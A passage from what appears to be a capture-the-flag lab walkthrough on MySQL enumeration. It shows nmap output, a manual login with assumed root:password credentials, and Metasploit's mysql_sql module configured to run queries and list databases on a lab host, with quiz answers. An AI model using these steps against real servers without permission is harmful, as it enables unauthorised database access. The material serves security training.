What language is MySQL based on?






<pre tabindex="0"><code>SQL</code></pre>
<br>
<p>What communication model does MySQL use?</p>






<pre tabindex="0"><code>client-server</code></pre>
<br>
<p>What is a common application of MySQL?</p>






<pre tabindex="0"><code>back end database</code></pre>
<br>
<p>What major social network uses MySQL as their back-end database? This will require further research.</p>






<pre tabindex="0"><code>Facebook</code></pre>
<br>
<h4 id="enumerating-mysql">Enumerating MySQL</h4>
<p>Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service. For the sake of the scenario, we&rsquo;re going to assume that we found the <code>credentials: &quot;root:password&quot;</code> while enumerating subdomains of a web server. After trying the login against SSH unsuccessfully, you decide to try it against MySQL.</p>
<br>
<p>As always, let&rsquo;s start out with a port scan, so we know what port the service we&rsquo;re trying to attack is running on. What port is MySQL using?</p>






<pre tabindex="0"><code>3306</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>PORT STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1</span></span></code></pre></div>
<br>
<p>Good, now – we think we have a set of credentials. Let&rsquo;s double check that by manually connecting to the MySQL server. We can do this using command <code>mysql -h [IP] -u [username] -p</code>.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# mysql -h 10.10.151.196 -u root -p
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Enter password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Welcome to the MySQL monitor. Commands end with ; or <span style="color:#89b4fa">\g</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Your MySQL connection id is <span style="color:#fab387">3</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Server version: 5.7.29-0ubuntu0.18.04.1 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Copyright <span style="color:#89dceb;font-weight:bold">(</span>c<span style="color:#89dceb;font-weight:bold">)</span> 2000, 2023, Oracle and/or its affiliates.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Oracle is a registered trademark of Oracle Corporation and/or its
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>affiliates. Other names may be trademarks of their respective
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>owners.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Type <span style="color:#a6e3a1">&#39;help;&#39;</span> or <span style="color:#a6e3a1">&#39;\h&#39;</span> <span style="color:#cba6f7">for</span> help. Type <span style="color:#a6e3a1">&#39;\c&#39;</span> to clear the current input statement.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>mysql&gt;</span></span></code></pre></div>
<br>
<p>Okay, we know that our login credentials work. Let&rsquo;s quit out of this session with &ldquo;exit&rdquo; and launch up Metasploit.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# msfconsole
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>This copy of metasploit-framework is more than two weeks old.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Consider running <span style="color:#a6e3a1">&#39;msfupdate&#39;</span> to update to the latest version.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>         .                                         .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>       <span style="color:#a6e3a1">&#39;   dB&#39;</span>                     BBP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>    dB<span style="color:#a6e3a1">&#39;dB&#39;</span>dB<span style="color:#a6e3a1">&#39; dBBP     dBP     dBP BB
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#a6e3a1">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#a6e3a1">dB&#39;</span>dB<span style="color:#a6e3a1">&#39;dB&#39;</span> dBP dBP dBP BB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>dB<span style="color:#a6e3a1">&#39;dB&#39;</span>dB<span style="color:#a6e3a1">&#39; dBBBBP dBP dBBBBBBB
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#a6e3a1">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#a6e3a1">                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span><span style="color:#a6e3a1">          .                  .                  dB&#39;</span> dBP    dB<span style="color:#a6e3a1">&#39;.BP
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span><span style="color:#a6e3a1">                             |       dBP    dBBBB&#39;</span> dBP    dB<span style="color:#a6e3a1">&#39;.BP dBP    dBP
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span><span style="color:#a6e3a1">                           --o--    dBP    dBP    dBP    dB&#39;</span>.BP dBP    dBP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>                                                                    .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>                .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>        o                  To boldly go where no
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>                            shell has gone <span style="color:#f5e0dc">before</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>       <span style="color:#89dceb;font-weight:bold">=[</span> metasploit v6.3.5-dev-                          <span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>- -- --<span style="color:#89dceb;font-weight:bold">=[</span> <span style="color:#fab387">2294</span> exploits - <span style="color:#fab387">1201</span> auxiliary - <span style="color:#fab387">410</span> post <span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>- -- --<span style="color:#89dceb;font-weight:bold">=[</span> <span style="color:#fab387">968</span> payloads - <span style="color:#fab387">45</span> encoders - <span style="color:#fab387">11</span> nops <span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>- -- --<span style="color:#89dceb;font-weight:bold">=[</span> <span style="color:#fab387">9</span> evasion <span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>Metasploit tip: Adapter names can be used <span style="color:#cba6f7">for</span> IP params
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span><span style="color:#89dceb">set</span> LHOST eth0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>Metasploit Documentation: https://docs.metasploit.com/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">38</span><span>msf6 &gt;</span></span></code></pre></div>
<br>
<p>We&rsquo;re going to be using the <code>mysql_sql</code> module.
Search for, select and list the options it needs. What three options do we need to set? (in descending order).</p>






<pre tabindex="0"><code>PASSWORD
RHOSTS
USERNAME</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 &gt; search mysql_sql
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#6c7086;font-style:italic"># Matching Modules</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic"># Name Disclosure Date Rank Check Description</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">0</span> auxiliary/admin/mysql/mysql_sql normal No MySQL SQL Generic Query
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Interact with a module by name or index. For example info 0, use <span style="color:#fab387">0</span> or use auxiliary/admin/mysql/mysql_sql
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>msf6 &gt; use <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>PASSWORD no The password <span style="color:#cba6f7">for</span> the specified username
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>RHOSTS yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metaspl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>oit.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>RPORT <span style="color:#fab387">3306</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>SQL <span style="color:#cba6f7">select</span> version<span style="color:#89dceb;font-weight:bold">()</span> yes The SQL to execute.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>USERNAME no The username to authenticate as
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>View the full module info with the info, or info -d command.</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> USERNAME root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#f5e0dc">USERNAME</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> RHOSTS 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#f5e0dc">RHOSTS</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> PASSWORD password
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#f5e0dc">PASSWORD</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; password</span></span></code></pre></div>
<br>
<p>Run the exploit. By default it will test with the <code>select version()</code> command, what result does this give you?</p>






<pre tabindex="0"><code>5.7.29-0ubuntu0.18.04.1</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Running module against 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Sending statement: <span style="color:#a6e3a1">&#39;select version()&#39;</span>...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - | 5.7.29-0ubuntu0.18.04.1 |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt;</span></span></code></pre></div>
<br>
<p>Great! We know that our exploit is landing as planned. Let&rsquo;s try to gain some more ambitious information. Change the sql option to show databases. How many databases are returned?</p>






<pre tabindex="0"><code>4</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> SQL show databases
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span><span style="color:#f5e0dc">SQL</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; show databases
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>PASSWORD password no The password <span style="color:#cba6f7">for</span> the specified username
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>RHOSTS 10.10.151.196 yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasplo
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>it.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>RPORT <span style="color:#fab387">3306</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>SQL show databases yes The SQL to execute.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>USERNAME root no The username to authenticate as
